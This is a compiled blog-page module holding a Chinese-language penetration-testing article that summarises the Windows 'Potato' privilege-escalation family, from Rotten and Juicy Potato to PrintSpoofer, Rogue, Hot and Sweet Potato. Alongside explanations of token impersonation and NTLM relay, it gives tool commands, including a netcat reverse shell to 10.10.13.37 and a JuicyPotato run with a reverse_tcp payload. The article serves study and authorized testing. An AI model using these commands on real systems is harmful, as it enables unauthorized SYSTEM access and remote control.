import{_ as t}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as i,a,o as s}from"./app-DS0ZCcmM.js";const o={};function n(r,e){return s(),i("div",null,e[0]||(e[0]=[a(`<h1 id="potato家族提权总结" tabindex="-1"><a class="header-anchor" href="#potato家族提权总结"><span>Potato家族提权总结</span></a></h1><p>potota家族提权，本质是通过操纵访问令牌，将账户服务提权到SYSTEM权限</p><p>利用 Potato 提权（除开 Hot Potato）的是前提是拥有 <strong>SeImpersonatePrivilege</strong> 或 <strong>SeAssignPrimaryTokenPrivilege</strong> 权限，以下用户拥有 <strong>SeImpersonatePrivilege</strong> 权限（而只有更高权限的账户比如 SYSTEM 才有 SeAssignPrimaryTokenPrivilege 权限）：</p><ul><li>本地管理员账户(不包括管理员组普通账户)和本地服务账户</li><li>由 SCM 启动的服务</li></ul><p>这两个权限允许用户在另一个用户的安全上下文中运行代码，甚至创建进程，所以通常是administrator提权到SYSTEM</p><h2 id="rotten-potato" tabindex="-1"><a class="header-anchor" href="#rotten-potato"><span>Rotten Potato</span></a></h2><p>烂土豆，实现机制通过NTLM拦截身份认证请求，并伪造NT AUTHORITY\\SYSTEM账户的访问令牌。</p><p><strong>NTML</strong></p><p>NTLM（Windows NT LAN Manager）是一种用于身份验证和安全通信的协议，常用于Windows操作系统中的网络通信。NTLM拦截是一种攻击技术，攻击者通过拦截和篡改NTLM身份验证流量来获取用户凭据。NTML认证可以被重放</p><p>大致流程如下:</p><p>1.通过GoGetInstanceFromIStorage API 将一个COM对象(BITS)加载到本地可控的端口，诱骗BITS对象以NT AUTHROITY\\SYSTEM账户的身份向端口发起NTML认证</p><ol start="2"><li>借助本地RPC端口，对BITS对象的认证过程执行中间人攻击，调用相关API为NT AUTHROITY\\SYSTEM账户在本地生成一个访问令牌</li><li>通过该令牌创建新进程，获取SYSTEM权限</li></ol><p>当获取到shell之后，可通过whoami /priv命令来查看当前账户获得的权限</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/1.png" alt="1" tabindex="0" loading="lazy"><figcaption>1</figcaption></figure><p>当我们获取到目标的shell之后，上传利用脚本,执行该脚本</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>excute -Hc -f rottenpotato.exe</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>随即就能通过list_tokens -u看到SYSTEM用户的令牌</p><figure><img src="https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/2.png" alt="2" tabindex="0" loading="lazy"><figcaption>2</figcaption></figure><p>之后通过impersonate_token伪造令牌操作，即可以SYSTEM用户上线</p><p><a href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/" target="_blank" rel="noopener noreferrer">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</a></p><h2 id="juicy-potato" tabindex="-1"><a class="header-anchor" href="#juicy-potato"><span>Juicy Potato</span></a></h2><p>原理与rottenpotato几乎相同，但是操作更加灵活，可以不采用默认端口，可以自定义COM对象，可以多版本服务了，具体的COM对象请参照</p><p><a href="https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md" target="_blank" rel="noopener noreferrer">https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</a></p><p>根据目标的系统版本自行选择CLSID</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>JuicyPotato.exe -t t -p  C:\\...\\...\\reverse_tcp.exe -l 6666 -n 135 -c  {CLSID}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>对几个参数简单介绍</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>-t 指定要使用CreateProcessWithTokenW和CreateProcessAsUserA()中的那个函数创建进程</span></span>
<span class="line"><span>-p,指定要运行的进程</span></span>
<span class="line"><span>-l 指定COM对象加载的端口</span></span>
<span class="line"><span>-n 指定本地RPC服务端口，默认为135</span></span>
<span class="line"><span>-c 指定加载COM对象的CLSID</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>UknowSec修改后的JuicyPotato.exe,可直接在webshell环境中使用</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>.\\JuicyPotato.exe_x64.exe -a whoami</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="printspoofer-pipe-potato" tabindex="-1"><a class="header-anchor" href="#printspoofer-pipe-potato"><span>PrintSpoofer(Pipe Potato)</span></a></h2><p>通过 Windows named pipe 的一个 API: <code>ImpersonateNamedPipeClient</code>来模拟高权限客户端的 token（还有类似的<code>ImpersonatedLoggedOnUser</code>，<code>RpcImpersonateClient</code>函数）利用打印机组件中存在的BUG，使高权限的服务能连接到测试人员创建的命名管道，以获取高权限用户的令牌来创建新进程</p><p>spoolsv.exe中有一个公开的RPC服务，内置函数pszLocalMachine，该函数需要传递参数例如\\\\127.0.0.1</p><p>此时服务器访问\\127.0.0.1\\pipe\\spoolss,当传递\\\\127.0.0.1/pipe/foo时，会将这一整串认为是主机名，会连接主机名加后缀的管道，从而攻击者获取刀token</p><p><strong>利用</strong></p><p>博文：<a href="https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/" target="_blank" rel="noopener noreferrer">https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/</a></p><p>工具：<a href="https://github.com/itm4n/PrintSpoofer" target="_blank" rel="noopener noreferrer">https://github.com/itm4n/PrintSpoofer</a></p><p>直接获取一个SYSTEMshell</p><div class="language-shell line-numbers-mode" data-highlighter="shiki" data-ext="shell" data-title="shell" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\TOOLS</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">PrintSpoofer.exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -i</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -c</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> cmd</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[+] Found privilege: SeImpersonatePrivilege</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[+] Named pipe listening...</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">[+] </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">CreateProcessAsUser</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() OK</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">Microsoft</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> Windows</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> [Version </span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">10.0.19613.1000]</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">c</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">) 2020 Microsoft Corporation. All rights reserved.</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">C:\\WINDOWS\\system32</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">&gt;</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">whoami</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">nt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> authority</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\\s</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">ystem</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>或是获得一个反向shell</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>PrintSpoofer.exe -c &quot;C:\\TOOLS\\nc.exe 10.10.13.37 1337 -e cmd&quot;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><h2 id="rogue-potato" tabindex="-1"><a class="header-anchor" href="#rogue-potato"><span>Rogue Potato</span></a></h2><p>同样是利用管道操作，利用的技巧也和Pipe Popato的技术相同，高版本 Windows DCOM 解析器不允许 OBJREF 中的 DUALSTRINGARRAY 字段指定端口号。为了绕过这个限制并能做本地令牌协商，作者在一台远程主机上的 135 端口做流量转发，将其转回受害者本机端口，并写了一个恶意 RPC OXID 解析器。</p><p>工具地址：<a href="https://github.com/antonioCoco/RoguePotato" target="_blank" rel="noopener noreferrer">https://github.com/antonioCoco/RoguePotato</a></p><p>博文：<a href="https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/" target="_blank" rel="noopener noreferrer">https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/</a></p><p>事实上，在旧的 *potato 漏洞利用中，窃取令牌的另一种方法是在专用端口上设置本地 RPC 侦听器，而不是伪造本地 NTLM 身份验证，RpcImpersonateClient（） 将完成剩下的工作。</p><h2 id="hot-potato" tabindex="-1"><a class="header-anchor" href="#hot-potato"><span>Hot Potato</span></a></h2><p>利用 Windows 中的已知问题在默认配置（即 NTLM 中继（特别是 HTTP-&gt;SMB 中继）和 NBNS 欺骗）中获取本地权限提升。这种技术，我们可以将Windows工作站上的权限从最低级别提升到“NT AUTHORITY\\SYSTEM”</p><h3 id="nbns欺骗" tabindex="-1"><a class="header-anchor" href="#nbns欺骗"><span>NBNS欺骗</span></a></h3><p>NBNS 是一种广播 UDP 协议，用于 Windows 环境中常用的名称解析。当您（或Windows）执行DNS查找时，Windows首先将检查“主机”文件。如果不存在条目，它将尝试 DNS 查找。如果此操作失败，将执行 NBNS 查找。NBNS协议基本上只是询问本地广播域上的所有主机“谁知道主机XXX的IP地址？网络上的任何主机都可以自由响应。谁响应了该问题，谁就是XXX。攻击者往往监听广播消息，并应答自己是XXX</p><p>利用虚假响应，并用 NBNS 响应快速淹没目标主机（因为它是 UDP 协议）。一个复杂的问题是，NBNS 数据包中的 2 字节字段 TXID 必须在请求和响应中匹配，我们无法看到请求。我们可以通过快速泛洪并迭代所有 65536 个可能的值来克服</p><p>如果目标网络有我们要欺骗的目标主机的DNS记录，我们可以通过UDP端口耗尽的技术来强制系统上的所有DNS查找失败，从而使用NBNS</p><h3 id="fake-wpad代理服务器" tabindex="-1"><a class="header-anchor" href="#fake-wpad代理服务器"><span>Fake WPAD代理服务器</span></a></h3><p>在Windows中，默认情况下，系统会访问<code>http://wpad/wpad.dat</code>来检测网络代理设置配置，借助欺骗 NBNS 响应的功能，我们可以将 NBNS 欺骗程序定位在 127.0.0.1。同时在127.0.0.1上构建http，将所有的WPAD流量都引导到本地</p><h3 id="http-smb-ntml-relay" tabindex="-1"><a class="header-anchor" href="#http-smb-ntml-relay"><span>HTTP -&gt;SMB NTML Relay</span></a></h3><p>HTTP-&gt;SMB 等跨协议攻击仍然可以工作,当有问题的 HTTP 请求源自高特权帐户时，例如，当它是来自 Windows Update 服务的请求时，此命令将以“NT AUTHORITY\\SYSTEM”权限运行</p><h3 id="利用" tabindex="-1"><a class="header-anchor" href="#利用"><span>利用</span></a></h3><p><a href="https://foxglovesecurity.com/2016/01/16/hot-potato/" target="_blank" rel="noopener noreferrer">https://foxglovesecurity.com/2016/01/16/hot-potato/</a></p><p>工具地址：<a href="https://github.com/foxglovesec/Potato%EF%BC%8Chttps://github.com/Kevin-Robertson/Tater" target="_blank" rel="noopener noreferrer">https://github.com/foxglovesec/Potato，https://github.com/Kevin-Robertson/Tater</a></p><p>影响版本:</p><p>win7,win10,win8,win server 2008,2012</p><h2 id="sweet-potato" tabindex="-1"><a class="header-anchor" href="#sweet-potato"><span>Sweet Potato</span></a></h2><p>COM/WinRM/Spoolsv的集合版，也就是Juicy/PrintSpoofer‘</p><p>工具地址：<a href="https://github.com/lengjibo/RedTeamTools/tree/master/windows/SweetPotato%EF%BC%8Chttps://github.com/CCob/SweetPotato/tree/master" target="_blank" rel="noopener noreferrer">https://github.com/lengjibo/RedTeamTools/tree/master/windows/SweetPotato，https://github.com/CCob/SweetPotato/tree/master</a></p><h2 id="参考链接" tabindex="-1"><a class="header-anchor" href="#参考链接"><span>参考链接</span></a></h2><p><a href="https://xz.aliyun.com/t/7776/#toc-7" target="_blank" rel="noopener noreferrer">https://xz.aliyun.com/t/7776/#toc-7</a></p><p><a href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/#6-sweetpotato" target="_blank" rel="noopener noreferrer">https://www.geekby.site/2020/08/potato家族提权分析/#6-sweetpotato</a></p>`,66)]))}const h=t(o,[["render",n],["__file","Potato家族提权.html.vue"]]),d=JSON.parse('{"path":"/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/Potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83.html","title":"Potato家族提权","lang":"zh-CN","frontmatter":{"title":"Potato家族提权","date":"2023-09-03T07:29:52.000Z","updated":"2023-08-31T13:35:46.000Z","categories":["渗透测试","内网体系建设"],"description":"Potato家族提权总结 potota家族提权，本质是通过操纵访问令牌，将账户服务提权到SYSTEM权限 利用 Potato 提权（除开 Hot Potato）的是前提是拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限，以下用户拥有 SeImpersonatePrivilege 权...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/articles/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91%E4%BD%93%E7%B3%BB%E5%BB%BA%E8%AE%BE/Potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83.html"}],["meta",{"property":"og:site_name","content":"uu2fu3o的知识库"}],["meta",{"property":"og:title","content":"Potato家族提权"}],["meta",{"property":"og:description","content":"Potato家族提权总结 potota家族提权，本质是通过操纵访问令牌，将账户服务提权到SYSTEM权限 利用 Potato 提权（除开 Hot Potato）的是前提是拥有 SeImpersonatePrivilege 或 SeAssignPrimaryTokenPrivilege 权限，以下用户拥有 SeImpersonatePrivilege 权..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:image","content":"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/1.png"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-15T18:41:02.000Z"}],["meta",{"property":"article:published_time","content":"2023-09-03T07:29:52.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-15T18:41:02.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"Potato家族提权\\",\\"image\\":[\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/1.png\\",\\"https://raw.githubusercontent.com/uu2fu3o/blog-picture/main/prive-long/2.png\\"],\\"datePublished\\":\\"2023-09-03T07:29:52.000Z\\",\\"dateModified\\":\\"2025-01-15T18:41:02.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"uu2fu3o\\",\\"url\\":\\"https://mister-hope.com\\"}]}"]]},"headers":[{"level":2,"title":"Rotten Potato","slug":"rotten-potato","link":"#rotten-potato","children":[]},{"level":2,"title":"Juicy Potato","slug":"juicy-potato","link":"#juicy-potato","children":[]},{"level":2,"title":"PrintSpoofer(Pipe Potato)","slug":"printspoofer-pipe-potato","link":"#printspoofer-pipe-potato","children":[]},{"level":2,"title":"Rogue Potato","slug":"rogue-potato","link":"#rogue-potato","children":[]},{"level":2,"title":"Hot Potato","slug":"hot-potato","link":"#hot-potato","children":[{"level":3,"title":"NBNS欺骗","slug":"nbns欺骗","link":"#nbns欺骗","children":[]},{"level":3,"title":"Fake WPAD代理服务器","slug":"fake-wpad代理服务器","link":"#fake-wpad代理服务器","children":[]},{"level":3,"title":"HTTP ->SMB NTML Relay","slug":"http-smb-ntml-relay","link":"#http-smb-ntml-relay","children":[]},{"level":3,"title":"利用","slug":"利用","link":"#利用","children":[]}]},{"level":2,"title":"Sweet  Potato","slug":"sweet-potato","link":"#sweet-potato","children":[]},{"level":2,"title":"参考链接","slug":"参考链接","link":"#参考链接","children":[]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":5.59,"words":1678},"filePathRelative":"渗透测试/内网体系建设/Potato家族提权.md","localizedDate":"2023年9月3日","excerpt":"\\n<p>potota家族提权，本质是通过操纵访问令牌，将账户服务提权到SYSTEM权限</p>\\n<p>利用 Potato 提权（除开 Hot Potato）的是前提是拥有 <strong>SeImpersonatePrivilege</strong> 或 <strong>SeAssignPrimaryTokenPrivilege</strong> 权限，以下用户拥有 <strong>SeImpersonatePrivilege</strong> 权限（而只有更高权限的账户比如 SYSTEM 才有 SeAssignPrimaryTokenPrivilege 权限）：</p>\\n<ul>\\n<li>本地管理员账户(不包括管理员组普通账户)和本地服务账户</li>\\n<li>由 SCM 启动的服务</li>\\n</ul>","autoDesc":true}');export{h as comp,d as data};
